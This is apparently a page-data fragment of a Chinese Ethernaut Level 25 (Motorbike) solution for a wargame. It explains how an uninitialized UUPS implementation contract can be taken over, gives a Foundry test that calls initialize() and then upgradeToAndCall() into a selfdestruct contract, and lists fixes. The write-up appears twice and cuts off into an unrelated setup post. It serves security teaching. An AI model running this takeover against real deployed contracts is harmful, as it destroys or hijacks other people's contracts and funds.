href=\"#📋-挑战目标\" class=\"headerlink\" title=\"📋 挑战目标\"></a>📋 挑战目标</h2><p>本关的目标是摧毁 <code>Engine</code> (引擎) 合约，即使得 <code>Engine</code> 合约的代码被从链上移除。你需要利用代理合约的漏洞来实现这一目标。</p>\n<p><img src=\"https://ethernaut.openzeppelin.com/imgs/BigLevel25.svg\" alt=\"Motorbike Requirements\"></p>\n<h2 id=\"🔍-漏洞分析\"><a href=\"#🔍-漏洞分析\" class=\"headerlink\" title=\"🔍 漏洞分析\"></a>🔍 漏洞分析</h2><p>本关卡涉及的是 UUPS (Universal Upgradeable Proxy Standard) 代理模式。在这种模式下，升级逻辑位于实现合约（<code>Engine</code>）中，而不是代理合约（<code>Motorbike</code>）中。</p>\n<ul>\n<li><code>Motorbike</code>: 代理合约，负责将调用转发到 <code>Engine</code>。</li>\n<li><code>Engine</code>: 实现合约，包含业务逻辑和升级逻辑。</li>\n</ul>\n<p>通常，代理合约在部署后会调用实现合约的 <code>initialize</code> 函数来设置初始状态（如 <code>owner</code>, <code>upgrader</code> 等）。然而，这个初始化调用只发生在代理合约的上下文中。<strong>实现合约本身（即 <code>Engine</code> 合约）的 <code>initialize</code> 函数从未被调用过</strong>，导致其状态变量（如 <code>upgrader</code>）仍为默认值（<code>address(0)</code>）。</p>\n<p>这就是核心漏洞：任何人都可以直接调用 <code>Engine</code> 实现合约的 <code>initialize()</code> 函数。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// In Engine.sol</span><br><span class=\"line\">address public upgrader;</span><br><span class=\"line\"></span><br><span class=\"line\">function initialize() public &#123;</span><br><span class=\"line\">    require(upgrader == address(0)); // This check passes on the uninitialized Engine contract</span><br><span class=\"line\">    upgrader = msg.sender;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>一旦我们调用了 <code>Engine</code> 的 <code>initialize()</code>，我们就会成为 <code>Engine</code> 合约的 <code>upgrader</code>。作为 <code>upgrader</code>，我们就可以调用 <code>upgradeToAndCall()</code> 函数。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// In Engine.sol</span><br><span class=\"line\">function upgradeToAndCall(address newImplementation, bytes memory data) public payable &#123;</span><br><span class=\"line\">    _authorizeUpgrade();</span><br><span class=\"line\">    _upgradeToAndCall(newImplementation, data);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">function _authorizeUpgrade() internal view &#123;</span><br><span class=\"line\">    require(msg.sender == upgrader, &quot;Can&#x27;t upgrade&quot;);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><code>upgradeToAndCall()</code> 允许我们将 <code>Engine</code> 的实现指向一个全新的合约，并执行新合约中的任意函数。我们的攻击计划是：</p>\n<ol>\n<li><strong>找到 <code>Engine</code> 实现合约的地址</strong>: UUPS代理的实现地址存储在特定的存储槽位 <code>0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc</code>。</li>\n<li><strong>成为 <code>upgrader</code></strong>: 直接调用 <code>Engine</code> 合约的 <code>initialize()</code> 函数。</li>\n<li><strong>部署恶意合约</strong>: 创建一个包含 <code>selfdestruct</code> 逻辑的攻击合约。</li>\n<li><strong>升级并自毁</strong>: 调用 <code>Engine</code> 的 <code>upgradeToAndCall()</code>，将实现指向我们的恶意合约，并调用其自毁函数。</li>\n</ol>\n<p><strong>关于 Dencun 升级 (EIP-6780) 的说明</strong>: 在 Dencun 升级后，<code>selfdestruct</code> 的行为发生了变化。它不再无条件地移除合约代码。然而，在许多测试环境和一些特定条件下，此攻击仍然有效。本解法基于 <code>selfdestruct</code> 能够移除合约代码的经典行为。</p>\n<h2 id=\"💻-Foundry-实现\"><a href=\"#💻-Foundry-实现\" class=\"headerlink\" title=\"💻 Foundry 实现\"></a>💻 Foundry 实现</h2><h3 id=\"Foundry-测试代码\"><a href=\"#Foundry-测试代码\" class=\"headerlink\" title=\"Foundry 测试代码\"></a>Foundry 测试代码</h3><p>测试代码将完整地模拟上述攻击流程。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: Unlicense</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;forge-std/Test.sol&quot;;</span><br><span class=\"line\">import &quot;src/25_Motorbike.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">// 接口定义</span><br><span class=\"line\">interface IEngine &#123;</span><br><span class=\"line\">    function initialize() external;</span><br><span class=\"line\">    function upgradeToAndCall(address newImplementation, bytes memory data) external;</span><br><span class=\"line\">    function upgrader() external view returns (address);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// 包含自毁逻辑的攻击合约</span><br><span class=\"line\">contract Attack &#123;</span><br><span class=\"line\">    function boom() external payable &#123;</span><br><span class=\"line\">        selfdestruct(payable(msg.sender));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">contract MotorbikeTest is Test &#123;</span><br><span class=\"line\">    Motorbike motorbikeInstance;</span><br><span class=\"line\">    IEngine engineInstance;</span><br><span class=\"line\">    address player;</span><br><span class=\"line\">    address engineAddress;</span><br><span class=\"line\"></span><br><span class=\"line\">    function setUp() public &#123;</span><br><span class=\"line\">        player = vm.addr(1);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 部署关卡合约</span><br><span class=\"line\">        Engine engine = new Engine();</span><br><span class=\"line\">        motorbikeInstance = new Motorbike(address(engine));</span><br><span class=\"line\"></span><br><span class=\"line\">        // 从代理合约的存储中读取实现合约的地址</span><br><span class=\"line\">        bytes32 implementationSlot = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;</span><br><span class=\"line\">        engineAddress = address(uint160(uint256(vm.load(address(motorbikeInstance), implementationSlot))));</span><br><span class=\"line\">        engineInstance = IEngine(engineAddress);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function testMotorbikeAttack() public &#123;</span><br><span class=\"line\">        vm.startPrank(player);</span><br><span class=\"line\"></span><br><span class=\"line\">        // 1. 部署攻击合约</span><br><span class=\"line\">        Attack attackContract = new Attack();</span><br><span class=\"line\"></span><br><span class=\"line\">        // 2. 直接调用实现合约的 initialize 函数，成为 upgrader</span><br><span class=\"line\">        engineInstance.initialize();</span><br><span class=\"line\">        assertEq(engineInstance.upgrader(), player, &quot;Player should be the upgrader&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">        // 3. 升级实现合约为我们的攻击合约，并调用 boom() 函数自毁</span><br><span class=\"line\">        bytes memory data = abi.encodeWithSignature(&quot;boom()&quot;);</span><br><span class=\"line\">        engineInstance.upgradeToAndCall(address(attackContract), data);</span><br><span class=\"line\"></span><br><span class=\"line\">        // 4. 验证实现合约的代码是否已被移除</span><br><span class=\"line\">        assertEq(engineAddress.code.length, 0, &quot;Engine contract should be destroyed&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">        vm.stopPrank();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"关键攻击步骤\"><a href=\"#关键攻击步骤\" class=\"headerlink\" title=\"关键攻击步骤\"></a>关键攻击步骤</h3><ol>\n<li><strong>定位实现合约</strong>: 使用 <code>vm.load</code> 和 EIP-1967 定义的存储槽位地址，从代理合约中找到 <code>Engine</code> 实现合约的地址。</li>\n<li><strong>调用 <code>initialize()</code></strong>: 直接与 <code>Engine</code> 合约交互，调用其 <code>initialize()</code> 函数，将 <code>player</code> 设置为 <code>upgrader</code>。</li>\n<li><strong>部署攻击合约</strong>: 创建一个简单的 <code>Attack</code> 合约，其中包含一个公共的 <code>boom()</code> 函数，该函数会调用 <code>selfdestruct</code>。</li>\n<li><strong>执行 <code>upgradeToAndCall()</code></strong>: 调用 <code>Engine</code> 合约的 <code>upgradeToAndCall()</code>，将 <code>newImplementation</code> 设置为 <code>Attack</code> 合约的地址，并将 <code>data</code> 设置为 <code>boom()</code> 函数的函数选择器。</li>\n</ol>\n<h2 id=\"🛡️-防御措施\"><a href=\"#🛡️-防御措施\" class=\"headerlink\" title=\"🛡️ 防御措施\"></a>🛡️ 防御措施</h2><ol>\n<li><p><strong>初始化实现合约</strong>: 在部署实现合约后，应立即调用其 <code>initialize</code> 函数（或在构造函数中完成初始化），以防止其他人抢先调用。可以添加一个 <code>initialized</code> 状态变量来确保初始化只进行一次。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 修复建议</span><br><span class=\"line\">contract Engine &#123;</span><br><span class=\"line\">    bool private _initialized;</span><br><span class=\"line\">    constructor() &#123;</span><br><span class=\"line\">        _disableInitializers();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    function initialize() public initializer &#123;</span><br><span class=\"line\">        // ...</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>OpenZeppelin 的 <code>Initializable</code> 合约提供了一个 <code>initializer</code> 修饰符，可以很好地解决这个问题。</p>\n</li>\n<li><p><strong>构造函数中初始化</strong>: 对于不可升级的合约，应在 <code>constructor</code> 中完成所有初始化，以确保在部署时就设置好所有权和关键参数。</p>\n</li>\n</ol>\n<h2 id=\"🔧-相关工具和技术\"><a href=\"#🔧-相关工具和技术\" class=\"headerlink\" title=\"🔧 相关工具和技术\"></a>🔧 相关工具和技术</h2><ul>\n<li><strong>UUPS (Universal Upgradeable Proxy Standard)</strong>: EIP-1822 定义的一种代理模式，它将升级逻辑放在实现合约中，比旧的透明代理模式更节省 Gas。</li>\n<li><strong>EIP-1967</strong>: 定义了代理合约中用于存储逻辑合约地址和管理员地址的标准存储槽位，以避免存储冲突。</li>\n<li><strong>未初始化的代理&#x2F;实现</strong>: 代理合约安全中一个常见的漏洞类别。无论是代理本身还是其实现合约，如果其初始化函数可以被任何人调用，就会导致严重的安全问题。</li>\n</ul>\n<h2 id=\"🎯-总结\"><a href=\"#🎯-总结\" class=\"headerlink\" title=\"🎯 总结\"></a>🎯 总结</h2><p><strong>核心概念</strong>:</p>\n<ul>\n<li>在使用 UUPS 代理模式时，不仅代理需要初始化，其底层的实现合约也需要被正确地初始化或禁用初始化函数。</li>\n<li>实现合约本身是一个独立的、可直接交互的合约，必须确保其公共&#x2F;外部函数受到与代理合约相同的访问控制保护。</li>\n</ul>\n<p><strong>攻击向量</strong>:</p>\n<ul>\n<li>找到未被初始化的实现合约。</li>\n<li>直接调用其初始化函数以获取特权（如 <code>upgrader</code> 角色）。</li>\n<li>利用获得的特权执行恶意操作（如升级到恶意实现并自毁）。</li>\n</ul>\n<p><strong>防御策略</strong>:</p>\n<ul>\n<li>确保实现合约的构造函数或一个一次性的部署脚本会调用其初始化函数，并设置 <code>initialized</code> 标志，防止重入。</li>\n<li>使用经过审计和广泛使用的代理实现，如 OpenZeppelin 的 UUPS-Upgradeable 合约。</li>\n</ul>\n<h2 id=\"📚-参考资料\"><a href=\"#📚-参考资料\" class=\"headerlink\" title=\"📚 参考资料\"></a>📚 参考资料</h2><ul>\n<li><a href=\"https://eips.ethereum.org/EIPS/eip-1822\">EIP-1822: Universal Upgradeable Proxy Standard (UUPS)</a></li>\n<li><a href=\"https://docs.openzeppelin.com/upgrades-plugins/1.x/uups-proxies\">OpenZeppelin Docs: UUPS Proxies</a></li>\n</ul>\n","more":"<h1 id=\"🎯-Ethernaut-Level-25-Motorbike-UUPS代理未授权初始化漏洞\"><a href=\"#🎯-Ethernaut-Level-25-Motorbike-UUPS代理未授权初始化漏洞\" class=\"headerlink\" title=\"🎯 Ethernaut Level 25: Motorbike - UUPS代理未授权初始化漏洞\"></a>🎯 Ethernaut Level 25: Motorbike - UUPS代理未授权初始化漏洞</h1><blockquote>\n<p><strong>关卡链接</strong>: <a href=\"https://ethernaut.openzeppelin.com/level/25\">Ethernaut Level 25 - Motorbike</a><br><strong>攻击类型</strong>: 未初始化的实现合约 (Uninitialized Implementation)<br><strong>难度</strong>: ⭐⭐⭐⭐☆</p>\n</blockquote>\n<h2 id=\"📋-挑战目标\"><a href=\"#📋-挑战目标\" class=\"headerlink\" title=\"📋 挑战目标\"></a>📋 挑战目标</h2><p>本关的目标是摧毁 <code>Engine</code> (引擎) 合约，即使得 <code>Engine</code> 合约的代码被从链上移除。你需要利用代理合约的漏洞来实现这一目标。</p>\n<p><img src=\"https://ethernaut.openzeppelin.com/imgs/BigLevel25.svg\" alt=\"Motorbike Requirements\"></p>\n<h2 id=\"🔍-漏洞分析\"><a href=\"#🔍-漏洞分析\" class=\"headerlink\" title=\"🔍 漏洞分析\"></a>🔍 漏洞分析</h2><p>本关卡涉及的是 UUPS (Universal Upgradeable Proxy Standard) 代理模式。在这种模式下，升级逻辑位于实现合约（<code>Engine</code>）中，而不是代理合约（<code>Motorbike</code>）中。</p>\n<ul>\n<li><code>Motorbike</code>: 代理合约，负责将调用转发到 <code>Engine</code>。</li>\n<li><code>Engine</code>: 实现合约，包含业务逻辑和升级逻辑。</li>\n</ul>\n<p>通常，代理合约在部署后会调用实现合约的 <code>initialize</code> 函数来设置初始状态（如 <code>owner</code>, <code>upgrader</code> 等）。然而，这个初始化调用只发生在代理合约的上下文中。<strong>实现合约本身（即 <code>Engine</code> 合约）的 <code>initialize</code> 函数从未被调用过</strong>，导致其状态变量（如 <code>upgrader</code>）仍为默认值（<code>address(0)</code>）。</p>\n<p>这就是核心漏洞：任何人都可以直接调用 <code>Engine</code> 实现合约的 <code>initialize()</code> 函数。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// In Engine.sol</span><br><span class=\"line\">address public upgrader;</span><br><span class=\"line\"></span><br><span class=\"line\">function initialize() public &#123;</span><br><span class=\"line\">    require(upgrader == address(0)); // This check passes on the uninitialized Engine contract</span><br><span class=\"line\">    upgrader = msg.sender;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p>一旦我们调用了 <code>Engine</code> 的 <code>initialize()</code>，我们就会成为 <code>Engine</code> 合约的 <code>upgrader</code>。作为 <code>upgrader</code>，我们就可以调用 <code>upgradeToAndCall()</code> 函数。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// In Engine.sol</span><br><span class=\"line\">function upgradeToAndCall(address newImplementation, bytes memory data) public payable &#123;</span><br><span class=\"line\">    _authorizeUpgrade();</span><br><span class=\"line\">    _upgradeToAndCall(newImplementation, data);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">function _authorizeUpgrade() internal view &#123;</span><br><span class=\"line\">    require(msg.sender == upgrader, &quot;Can&#x27;t upgrade&quot;);</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<p><code>upgradeToAndCall()</code> 允许我们将 <code>Engine</code> 的实现指向一个全新的合约，并执行新合约中的任意函数。我们的攻击计划是：</p>\n<ol>\n<li><strong>找到 <code>Engine</code> 实现合约的地址</strong>: UUPS代理的实现地址存储在特定的存储槽位 <code>0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc</code>。</li>\n<li><strong>成为 <code>upgrader</code></strong>: 直接调用 <code>Engine</code> 合约的 <code>initialize()</code> 函数。</li>\n<li><strong>部署恶意合约</strong>: 创建一个包含 <code>selfdestruct</code> 逻辑的攻击合约。</li>\n<li><strong>升级并自毁</strong>: 调用 <code>Engine</code> 的 <code>upgradeToAndCall()</code>，将实现指向我们的恶意合约，并调用其自毁函数。</li>\n</ol>\n<p><strong>关于 Dencun 升级 (EIP-6780) 的说明</strong>: 在 Dencun 升级后，<code>selfdestruct</code> 的行为发生了变化。它不再无条件地移除合约代码。然而，在许多测试环境和一些特定条件下，此攻击仍然有效。本解法基于 <code>selfdestruct</code> 能够移除合约代码的经典行为。</p>\n<h2 id=\"💻-Foundry-实现\"><a href=\"#💻-Foundry-实现\" class=\"headerlink\" title=\"💻 Foundry 实现\"></a>💻 Foundry 实现</h2><h3 id=\"Foundry-测试代码\"><a href=\"#Foundry-测试代码\" class=\"headerlink\" title=\"Foundry 测试代码\"></a>Foundry 测试代码</h3><p>测试代码将完整地模拟上述攻击流程。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br><span class=\"line\">11</span><br><span class=\"line\">12</span><br><span class=\"line\">13</span><br><span class=\"line\">14</span><br><span class=\"line\">15</span><br><span class=\"line\">16</span><br><span class=\"line\">17</span><br><span class=\"line\">18</span><br><span class=\"line\">19</span><br><span class=\"line\">20</span><br><span class=\"line\">21</span><br><span class=\"line\">22</span><br><span class=\"line\">23</span><br><span class=\"line\">24</span><br><span class=\"line\">25</span><br><span class=\"line\">26</span><br><span class=\"line\">27</span><br><span class=\"line\">28</span><br><span class=\"line\">29</span><br><span class=\"line\">30</span><br><span class=\"line\">31</span><br><span class=\"line\">32</span><br><span class=\"line\">33</span><br><span class=\"line\">34</span><br><span class=\"line\">35</span><br><span class=\"line\">36</span><br><span class=\"line\">37</span><br><span class=\"line\">38</span><br><span class=\"line\">39</span><br><span class=\"line\">40</span><br><span class=\"line\">41</span><br><span class=\"line\">42</span><br><span class=\"line\">43</span><br><span class=\"line\">44</span><br><span class=\"line\">45</span><br><span class=\"line\">46</span><br><span class=\"line\">47</span><br><span class=\"line\">48</span><br><span class=\"line\">49</span><br><span class=\"line\">50</span><br><span class=\"line\">51</span><br><span class=\"line\">52</span><br><span class=\"line\">53</span><br><span class=\"line\">54</span><br><span class=\"line\">55</span><br><span class=\"line\">56</span><br><span class=\"line\">57</span><br><span class=\"line\">58</span><br><span class=\"line\">59</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// SPDX-License-Identifier: Unlicense</span><br><span class=\"line\">pragma solidity ^0.8.0;</span><br><span class=\"line\"></span><br><span class=\"line\">import &quot;forge-std/Test.sol&quot;;</span><br><span class=\"line\">import &quot;src/25_Motorbike.sol&quot;;</span><br><span class=\"line\"></span><br><span class=\"line\">// 接口定义</span><br><span class=\"line\">interface IEngine &#123;</span><br><span class=\"line\">    function initialize() external;</span><br><span class=\"line\">    function upgradeToAndCall(address newImplementation, bytes memory data) external;</span><br><span class=\"line\">    function upgrader() external view returns (address);</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">// 包含自毁逻辑的攻击合约</span><br><span class=\"line\">contract Attack &#123;</span><br><span class=\"line\">    function boom() external payable &#123;</span><br><span class=\"line\">        selfdestruct(payable(msg.sender));</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br><span class=\"line\"></span><br><span class=\"line\">contract MotorbikeTest is Test &#123;</span><br><span class=\"line\">    Motorbike motorbikeInstance;</span><br><span class=\"line\">    IEngine engineInstance;</span><br><span class=\"line\">    address player;</span><br><span class=\"line\">    address engineAddress;</span><br><span class=\"line\"></span><br><span class=\"line\">    function setUp() public &#123;</span><br><span class=\"line\">        player = vm.addr(1);</span><br><span class=\"line\">        </span><br><span class=\"line\">        // 部署关卡合约</span><br><span class=\"line\">        Engine engine = new Engine();</span><br><span class=\"line\">        motorbikeInstance = new Motorbike(address(engine));</span><br><span class=\"line\"></span><br><span class=\"line\">        // 从代理合约的存储中读取实现合约的地址</span><br><span class=\"line\">        bytes32 implementationSlot = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;</span><br><span class=\"line\">        engineAddress = address(uint160(uint256(vm.load(address(motorbikeInstance), implementationSlot))));</span><br><span class=\"line\">        engineInstance = IEngine(engineAddress);</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\"></span><br><span class=\"line\">    function testMotorbikeAttack() public &#123;</span><br><span class=\"line\">        vm.startPrank(player);</span><br><span class=\"line\"></span><br><span class=\"line\">        // 1. 部署攻击合约</span><br><span class=\"line\">        Attack attackContract = new Attack();</span><br><span class=\"line\"></span><br><span class=\"line\">        // 2. 直接调用实现合约的 initialize 函数，成为 upgrader</span><br><span class=\"line\">        engineInstance.initialize();</span><br><span class=\"line\">        assertEq(engineInstance.upgrader(), player, &quot;Player should be the upgrader&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">        // 3. 升级实现合约为我们的攻击合约，并调用 boom() 函数自毁</span><br><span class=\"line\">        bytes memory data = abi.encodeWithSignature(&quot;boom()&quot;);</span><br><span class=\"line\">        engineInstance.upgradeToAndCall(address(attackContract), data);</span><br><span class=\"line\"></span><br><span class=\"line\">        // 4. 验证实现合约的代码是否已被移除</span><br><span class=\"line\">        assertEq(engineAddress.code.length, 0, &quot;Engine contract should be destroyed&quot;);</span><br><span class=\"line\"></span><br><span class=\"line\">        vm.stopPrank();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n\n<h3 id=\"关键攻击步骤\"><a href=\"#关键攻击步骤\" class=\"headerlink\" title=\"关键攻击步骤\"></a>关键攻击步骤</h3><ol>\n<li><strong>定位实现合约</strong>: 使用 <code>vm.load</code> 和 EIP-1967 定义的存储槽位地址，从代理合约中找到 <code>Engine</code> 实现合约的地址。</li>\n<li><strong>调用 <code>initialize()</code></strong>: 直接与 <code>Engine</code> 合约交互，调用其 <code>initialize()</code> 函数，将 <code>player</code> 设置为 <code>upgrader</code>。</li>\n<li><strong>部署攻击合约</strong>: 创建一个简单的 <code>Attack</code> 合约，其中包含一个公共的 <code>boom()</code> 函数，该函数会调用 <code>selfdestruct</code>。</li>\n<li><strong>执行 <code>upgradeToAndCall()</code></strong>: 调用 <code>Engine</code> 合约的 <code>upgradeToAndCall()</code>，将 <code>newImplementation</code> 设置为 <code>Attack</code> 合约的地址，并将 <code>data</code> 设置为 <code>boom()</code> 函数的函数选择器。</li>\n</ol>\n<h2 id=\"🛡️-防御措施\"><a href=\"#🛡️-防御措施\" class=\"headerlink\" title=\"🛡️ 防御措施\"></a>🛡️ 防御措施</h2><ol>\n<li><p><strong>初始化实现合约</strong>: 在部署实现合约后，应立即调用其 <code>initialize</code> 函数（或在构造函数中完成初始化），以防止其他人抢先调用。可以添加一个 <code>initialized</code> 状态变量来确保初始化只进行一次。</p>\n<figure class=\"highlight plaintext\"><table><tr><td class=\"gutter\"><pre><span class=\"line\">1</span><br><span class=\"line\">2</span><br><span class=\"line\">3</span><br><span class=\"line\">4</span><br><span class=\"line\">5</span><br><span class=\"line\">6</span><br><span class=\"line\">7</span><br><span class=\"line\">8</span><br><span class=\"line\">9</span><br><span class=\"line\">10</span><br></pre></td><td class=\"code\"><pre><span class=\"line\">// 修复建议</span><br><span class=\"line\">contract Engine &#123;</span><br><span class=\"line\">    bool private _initialized;</span><br><span class=\"line\">    constructor() &#123;</span><br><span class=\"line\">        _disableInitializers();</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">    function initialize() public initializer &#123;</span><br><span class=\"line\">        // ...</span><br><span class=\"line\">    &#125;</span><br><span class=\"line\">&#125;</span><br></pre></td></tr></table></figure>\n<p>OpenZeppelin 的 <code>Initializable</code> 合约提供了一个 <code>initializer</code> 修饰符，可以很好地解决这个问题。</p>\n</li>\n<li><p><strong>构造函数中初始化</strong>: 对于不可升级的合约，应在 <code>constructor</code> 中完成所有初始化，以确保在部署时就设置好所有权和关键参数。</p>\n</li>\n</ol>\n<h2 id=\"🔧-相关工具和技术\"><a href=\"#🔧-相关工具和技术\" class=\"headerlink\" title=\"🔧 相关工具和技术\"></a>🔧 相关工具和技术</h2><ul>\n<li><strong>UUPS (Universal Upgradeable Proxy Standard)</strong>: EIP-1822 定义的一种代理模式，它将升级逻辑放在实现合约中，比旧的透明代理模式更节省 Gas。</li>\n<li><strong>EIP-1967</strong>: 定义了代理合约中用于存储逻辑合约地址和管理员地址的标准存储槽位，以避免存储冲突。</li>\n<li><strong>未初始化的代理&#x2F;实现</strong>: 代理合约安全中一个常见的漏洞类别。无论是代理本身还是其实现合约，如果其初始化函数可以被任何人调用，就会导致严重的安全问题。</li>\n</ul>\n<h2 id=\"🎯-总结\"><a href=\"#🎯-总结\" class=\"headerlink\" title=\"🎯 总结\"></a>🎯 总结</h2><p><strong>核心概念</strong>:</p>\n<ul>\n<li>在使用 UUPS 代理模式时，不仅代理需要初始化，其底层的实现合约也需要被正确地初始化或禁用初始化函数。</li>\n<li>实现合约本身是一个独立的、可直接交互的合约，必须确保其公共&#x2F;外部函数受到与代理合约相同的访问控制保护。</li>\n</ul>\n<p><strong>攻击向量</strong>:</p>\n<ul>\n<li>找到未被初始化的实现合约。</li>\n<li>直接调用其初始化函数以获取特权（如 <code>upgrader</code> 角色）。</li>\n<li>利用获得的特权执行恶意操作（如升级到恶意实现并自毁）。</li>\n</ul>\n<p><strong>防御策略</strong>:</p>\n<ul>\n<li>确保实现合约的构造函数或一个一次性的部署脚本会调用其初始化函数，并设置 <code>initialized</code> 标志，防止重入。</li>\n<li>使用经过审计和广泛使用的代理实现，如 OpenZeppelin 的 UUPS-Upgradeable 合约。</li>\n</ul>\n<h2 id=\"📚-参考资料\"><a href=\"#📚-参考资料\" class=\"headerlink\" title=\"📚 参考资料\"></a>📚 参考资料</h2><ul>\n<li><a href=\"https://eips.ethereum.org/EIPS/eip-1822\">EIP-1822: Universal Upgradeable Proxy Standard (UUPS)</a></li>\n<li><a href=\"https://docs.openzeppelin.com/upgrades-plugins/1.x/uups-proxies\">OpenZeppelin Docs: UUPS Proxies</a></li>\n</ul>\n"},{"title":"Foundry 环境搭建与 Ethernaut 项目配置","date":"2025-01-25T06:05:00.000Z","updated":"2025-01-25T06:05:00.000Z","series":"Ethernaut Foundry Solutions","excerpt":"详细介绍如何安装和配置 Foundry 开发环境，为学习 Ethernaut 智能合约安全挑战做好准备。","_content":"\n# 🛠️ Foundry 环境搭建与 Ethernaut 项目配置\n\n> 在开始 Ethernaut 安全挑战之前，我们需要搭建一个完整的 Foundry 开发环境。本文将详细介绍从零开始的完整配置流程。\n\n## 📚 什么是 Foundry?\n\n**Foundry** 是一个用 Rust 编写的快速、可移植和模块化的以太坊开发工具包，包含：\n\n- **Forge**: 测试框架\n- **Cast**: 瑞士军刀般的 RPC 工具\n- **Anvil**: 本地测试网络\n- **Chisel**: Solidity REPL\n\n### 与其他工具对比\n\n| 工具 | 语言 | 测试速度 | 